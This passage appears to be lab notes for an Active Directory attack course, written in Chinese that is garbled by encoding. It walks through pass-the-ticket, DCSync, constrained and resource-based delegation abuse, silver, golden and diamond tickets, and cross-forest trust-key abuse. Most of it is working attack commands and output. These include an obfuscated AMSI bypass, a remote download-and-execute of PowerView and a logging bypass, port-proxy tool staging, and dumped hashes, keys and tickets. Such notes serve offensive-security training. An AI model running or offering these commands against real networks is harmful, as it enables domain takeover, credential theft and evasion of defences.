  StartTime             :  6/1/2025 3:02:00 PM
  EndTime               :  6/2/2025 1:01:31 AM
  RenewTill             :  6/8/2025 3:01:31 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIGRTCCBkGgAwIBBa.......
[*] Ticket cache size: 1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨å­¦ç”Ÿæœºå™¨ä¸Šä½¿ç”¨Rubeusè¿›è¡ŒPass-The-Ticketï¼ˆPTTï¼‰å°†ç¥¨æ®æ³¨å…¥ä¼šè¯&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket: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

# æ£€æŸ¥æ˜¯å¦æ³¨å…¥æˆåŠŸï¼ˆæ£€æŸ¥å½“å‰ç¥¨æ®ï¼‰
klist
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨ä¼šè¯ä¸­æ‰§è¡ŒDCSync&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args &quot;lsadump::evasive-dcsync /user:dcorp\krbtgt&quot; &quot;exit&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;çº¦æŸæ€§å§”æ´¾&lt;/h4&gt;
&lt;p&gt;æšä¸¾å…·æœ‰çº¦æŸæ€§å§”æ´¾çš„&lt;strong&gt;ç”¨æˆ·&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;. C:\AD\Tools\PowerView.ps1

Get-DomainUser -TrustedToAuth
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åˆ©ç”¨ä¹‹å‰è·å¾—çš„websvcç§˜é’¥ï¼Œä½¿ç”¨Rubeusæ»¥ç”¨&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:&quot;CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL&quot; /ptt

# klistæ£€æŸ¥æ˜¯å¦å·²æ³¨å…¥æˆåŠŸ
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å°è¯•è®¿é—®dcorp-mssqlçš„æ–‡ä»¶ç³»ç»Ÿ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Value of msds-allowedtodelegate to attribute of dcorp-adminsrv ï¼Ÿ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Get-DomainComputer dcorp-adminsrv
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æšä¸¾å…·æœ‰çº¦æŸæ€§å§”æ´¾çš„&lt;strong&gt;è®¡ç®—æœºè´¦æˆ·&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Get-DomainComputer -TrustedToAuth
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä½¿ç”¨ä¸Šé¢å‘½ä»¤çš„ç»“æœ dcorp-adminsrv åˆ©ç”¨ Rubeus æ»¥ç”¨çº¦æŸæ€§å§”æ´¾&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt

# klist æ£€æŸ¥å‘ç°ldapæœåŠ¡
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ»¥ç”¨ldapç¥¨æ®&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args &quot;lsadump::evasive-dcsync /user:dcorp\krbtgt&quot; &quot;exit&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ï¼ˆRBCDï¼‰&lt;/h4&gt;
&lt;p&gt;PowerViewæŒ¨ä¸ªæšä¸¾æˆ–bloodhoundæŸ¥GenericWriteæƒé™&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Find-InterestingDomainACL | ?{$_.identityreferencename -match &apos;ciadmin&apos;}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¼¹ä¸ªciadminçš„shellå¹¶åŠ è½½PowerView&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;iex (iwr http://172.16.100.26/sbloggingbypass.txt -UseBasicParsing)

S`eT-It`em ( &apos;V&apos;+&apos;aR&apos; +  &apos;IA&apos; + ((&quot;{1}{0}&quot;-f&apos;1&apos;,&apos;blE:&apos;)+&apos;q2&apos;)  + (&apos;uZ&apos;+&apos;x&apos;)  ) ( [TYpE](  &quot;{1}{0}&quot;-F&apos;F&apos;,&apos;rE&apos;  ) )  ;    (    Get-varI`A`BLE  ( (&apos;1Q&apos;+&apos;2U&apos;)  +&apos;zX&apos;  )  -VaL  ).&quot;A`ss`Embly&quot;.&quot;GET`TY`Pe&quot;((  &quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f(&apos;Uti&apos;+&apos;l&apos;),&apos;A&apos;,(&apos;Am&apos;+&apos;si&apos;),((&quot;{0}{1}&quot; -f &apos;.M&apos;,&apos;an&apos;)+&apos;age&apos;+&apos;men&apos;+&apos;t.&apos;),(&apos;u&apos;+&apos;to&apos;+(&quot;{0}{2}{1}&quot; -f &apos;ma&apos;,&apos;.&apos;,&apos;tion&apos;)),&apos;s&apos;,((&quot;{1}{0}&quot;-f &apos;t&apos;,&apos;Sys&apos;)+&apos;em&apos;)  ) ).&quot;g`etf`iElD&quot;(  ( &quot;{0}{2}{1}&quot; -f(&apos;a&apos;+&apos;msi&apos;),&apos;d&apos;,(&apos;I&apos;+(&quot;{0}{1}&quot; -f &apos;ni&apos;,&apos;tF&apos;)+(&quot;{1}{0}&quot;-f &apos;ile&apos;,&apos;a&apos;))  ),(  &quot;{2}{4}{0}{1}{3}&quot; -f (&apos;S&apos;+&apos;tat&apos;),&apos;i&apos;,(&apos;Non&apos;+(&quot;{1}{0}&quot; -f&apos;ubl&apos;,&apos;P&apos;)+&apos;i&apos;),&apos;c&apos;,&apos;c,&apos;  )).&quot;sE`T`VaLUE&quot;(  ${n`ULl},${t`RuE} )

iex ((New-Object Net.WebClient).DownloadString(&apos;http://172.16.100.26/PowerView.ps1&apos;))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨dcorp-mgmtä¸Šä¸ºstudenté…ç½®RBCD&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom &apos;dcorp-std226$&apos; -Verbose
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;éªŒè¯&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Get-DomainRBCD
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç®¡ç†å‘˜æƒé™èµ·ä¸ªshellï¼Œæ‹¿stdçš„AESKey&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args &quot;sekurlsa::evasive-keys&quot; &quot;exit&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä½¿ç”¨Rubeusï¼Œæ»¥ç”¨RBCDä»¥ç®¡ç†å‘˜èº«ä»½è®¿é—®dcorp-mgmt - Administrator&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-std226$ /aes256:23f3b5fe9d6f2b759ce2b4ab472d253584dbd543b762e9ba5ffcb54171fe0a2d /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ£€æŸ¥&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;winrs -r:dcorp-mgmt cmd
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator.dcorp&amp;gt;set username
set username
USERNAME=Administrator

C:\Users\Administrator.dcorp&amp;gt;set computername
set computername
COMPUTERNAME=DCORP-MGMT

C:\Users\Administrator.dcorp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;è·¨åŸŸ&lt;/h2&gt;
&lt;h4&gt;SID History&lt;/h4&gt;
&lt;p&gt;ä»¥DAæƒé™å¯åŠ¨è¿›ç¨‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¤åˆ¶Loaderåˆ°dcä¸Šï¼Œç„¶åè¿æ¥è‡³dc&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y

winrs -r:dcorp-dc cmd
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åŠ è·¯ç”±ï¼Œæ‹¿rc4&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.26

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args &quot;lsadump::evasive-trust /patch&quot; &quot;exit&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¼ªé€ ä¸€ä¸ª Silver Ticketï¼Œæ¨¡æ‹Ÿ &lt;code&gt;Administrator&lt;/code&gt; ç”¨æˆ·ï¼Œé™„å¸¦ &lt;code&gt;Enterprise Admins&lt;/code&gt; æƒé™çš„ SIDï¼ŒæœåŠ¡ç›®æ ‡ä¸º LDAPï¼Œå¹¶å°†è¿™ä¸ªç¥¨æ®ç›´æ¥æ³¨å…¥å½“å‰ä¼šè¯å†…å­˜ä¸­ï¼Œå®ç°æ— éœ€å¯†ç çš„æŒä¹…åŒ–æƒé™æå‡ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:55eac0e2603d0297a4f10154751ee059 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä½¿ç”¨ä¸Šé¢è·å–çš„TGTå‘æŒ‡å®šçš„åŸŸæ§è¯·æ±‚ä¸€ä¸ªè®¿é—®ç›®æ ‡æœåŠ¡ï¼ˆSPNï¼‰çš„TGSï¼Œå¹¶ç«‹å³æ³¨å…¥&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Rubeus.exe -arge asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket: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
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿æ¥mcorp-dcå¹¶æ£€æŸ¥&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools&amp;gt;winrs -r:mcorp-dc.moneycorp.local cmd
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator.dcorp&amp;gt;set username
set username
USERNAME=Administrator

C:\Users\Administrator.dcorp&amp;gt;set computername
set computername
COMPUTERNAME=MCORP-DC

C:\Users\Administrator.dcorp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;krbtgtæ»¥ç”¨&lt;/h4&gt;
&lt;p&gt;é»„é‡‘ç¥¨æ®&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt

## éªŒè¯
winrs -r:mcorp-dc.moneycorp.local cmd
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é’»çŸ³ç¥¨æ®&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# æ‰¾åˆ°åŸŸæ§ç»„çš„SID
Get-DomainGroup -Domain moneycorp.local

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:dcorp-dc$ /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:1000 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æœ‰äº†é’»çŸ³ç¥¨æˆ–é»„é‡‘ç¥¨åï¼Œè¿›è¡ŒDCSyncæ”»å‡»&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args &quot;lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local&quot; &quot;exit&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;è·¨å¤–éƒ¨ä¿¡ä»»ï¼ˆè·¨æ—ï¼‰&lt;/h2&gt;
&lt;p&gt;ç™»å½•åŸŸç®¡ç†å‘˜&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¤åˆ¶åˆ°åŸŸæ§&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿æ¥åŸŸæ§ï¼ŒåŠ è·¯ç”±&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;winrs -r:dcorp-dc cmd

netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.26
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;æšä¸¾å¹¶è½¬å‚¨æœ¬åœ°æœºå™¨ä¸Šæ‰€æœ‰çš„â€œä¿¡ä»»ä¿¡æ¯â€&lt;/strong&gt;ï¼ˆåŒ…æ‹¬æ—ä¿¡ä»»ã€åŸŸä¿¡ä»»ã€TGT è¿‡æ»¤ç­–ç•¥ç­‰ï¼‰ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args &quot;lsadump::evasive-trust /patch&quot; &quot;exit&quot;

Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-3333069040-3914854601-3606488808)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -&amp;gt; EUROCORP.LOCAL
    * 6/5/2025 3:05:26 PM - CLEAR   - 5e 04 82 08 e1 9b 28 9a 07 fc 27 52 29 63 51 ba 53 da 48 6a 07 23 27 bf 0a 61 55 db
        * aes256_hmac       acc251405775974df796bfe82ffed323de87b711307df93e6f4369a4c9e9ba92
        * aes128_hmac       31b7174f9a2c7d1599944e7582db6a78
        * rc4_hmac_nt       34dc4cb38c9129feeed1fdb66a1de2da
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä½¿ç”¨Rubeusä¼ªé€ è·¨åŸŸTGT&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;## é€šè¿‡å†…å­˜åŠ è½½æ–¹å¼ç”Ÿæˆå¹¶æ³¨å…¥ä¸€ä¸ªä¼ªé€ çš„é“¶ç¥¨ï¼Œä¼ªè£…æˆ Administratorï¼Œç»•è¿‡è®¤è¯è®¿é—® DOLLARCORP.MONEYCORP.LOCAL åŸŸä¸­çš„æœåŠ¡ï¼Œé¿å…è½åœ°ç—•è¿¹ä»¥è§„é¿æ£€æµ‹ã€‚

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:34dc4cb38c9129feeed1fdb66a1de2da /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap


doIGFjCCBhKgAwIBBaEDAgEWooIE4jCCBN5hggTaMIIE1qADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBH4wggR6oAMCARehAwIBA6KCBGwEggRo88AafWDrP6XXx1r+hFGA57Iao0Q1E2Yw3hDpHnnBwhc2sMHZ7DTPswxSlmdwMwl+8/KqTtMTLMtGF/n9pyHQI0iFgVeK1WVEXSpE+N3NT7LNC36ZP6rAhzUhudvVBKOj+YLmSFG9INBHH1/wvZsG0QJXQmeRUstyTqjc4facMkIjTvrRCC6yTfuXdaK5Zyk/rrD99XXIizy7AZe2F5mxDYniqm5V2V4I3uwAx/EHv6ppJu91KmoKmSWJu2taeYm1yUAwRxfAZlnGEOWNsZWTrdKdL4ZX9Jpsc9tqt+5k8UWBNWXx5yzAG1Fv5k6yQRj3dv/p3MgzL9L/S14DiXKKTOcoOHQlDr5d7HlVUfrkWBnt4xqWeNSWyAM4m26ECtkGdn+o7so8vGNOxZPSnFxREgm95EArczpEYPS2rMwB6/97lVp6E4zjFXQHcIr/+VTCRxzUO7B78yDi/QYrRKTgI2wRmEj0e4sxgGirgtCtCO9mRVY5DoDfiywLExNYfx6X3dEH9hbhg61cyOLAWbxnB4qmUK1wQoQge4rBJ63UfzrrodDV0NypIwjnmQtWsQ8uXi0YqWsu2skhqI4fKS8XHJ9sTwBIsBxOBGoON10W4a4evjFTCJMcHJy2IaqH5DRhsKZImhiVJfMNCWdiv2K5j2OmZue+YuI4Rj/Jf1ydf4L46GdF1EaFqpF0Z+/VBJolrG7RQaRv1ZS5tNCcPFq+KWQ7lR1TpPhbf5XJbLcWrgbuG3JtKPn/TF26pxY/mDxzoBIl5GtdUZkdxaLXR9T0oWbvSO+7qj7thy4GMcP8WuNF7E5ZiZMS1zt43TQ4lB/h0FcQVAsL71JvD6+a4kRtGd4aIVmlGQSqWycl5daRctE/OojH/miW29LcrA8m9nEfGnzalOZ3BkdZbwYCi67eGkbtqasmNvMqa39ih57cr6tb7kf8+u/G7RmArqW7cjC5hcWrADyZcKgXvrrgBPQh8UfjjhhctcI2l/pnCmyVxutXzG1bjQTfywVc1OAeNKRaHNaxg1XEP37F+rLguASzn+qREYMhi7whqQ2wImKMklUScSRX/W/62g9/usTdbI+bkzZBz1jEb/NbSsNMqAUEHou9gs0NMxlFRhI/JZ739DTq00EqVzIy/f+nKd02DNZzyzaZ03PDmMoFVXr042aINfQCZZTvrfo4lp7UvtDPmYN4xMu+bZAaUjyiIT6aJldacTIqdysKTEdTbOkXZnevMe+8yQIA5kc9OF84BvzDnr8qm4aWCYtol5t1DtIKzfpxLNgHEJavfRPXpqdbbYQYbpDxfm1DiACEDY8U2J5nJBmDUKkj5n9bTsMtZtyg4kxmtX9FYD9Dt2Y36kbOHdpbDEr18y7AEPooXcAsw7B3bJJnOTgnEaCVtn5WmdXc+4eIBcgkJ5QSNl792iSCzEkhr5K/urnwEbGzdYjbr16xXIlMljHMnbf9ACxjnkSET9tn+umL1Yl1xV7P4KN8YTakNipunnc/n0tlo4IBHjCCARqgAwIBAKKCAREEggENfYIBCTCCAQWgggEBMIH+MIH7oBswGaADAgEXoRIEEL+RNDw1WTQn6HnX33em7uWhHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUyiGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBAoAAApBEYDzIwMjUwNjA2MDgzNjM5WqURGA8yMDI1MDYwNjA4MzYzOVqmERgPMjAyNTA2MDYxODM2MzlapxEYDzIwMjUwNjEzMDgzNjM5WqgcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKkvMC2gAwIBAqEmMCQbBmtyYnRndBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUw=
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æšä¸¾å¯èƒ½å­˜åœ¨cifsæœåŠ¡çš„ä»»ä½•æœºå™¨ï¼&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;net view \\eurocorp-dc.eurocorp.local
&lt;/code&gt;&lt;/pre&gt;
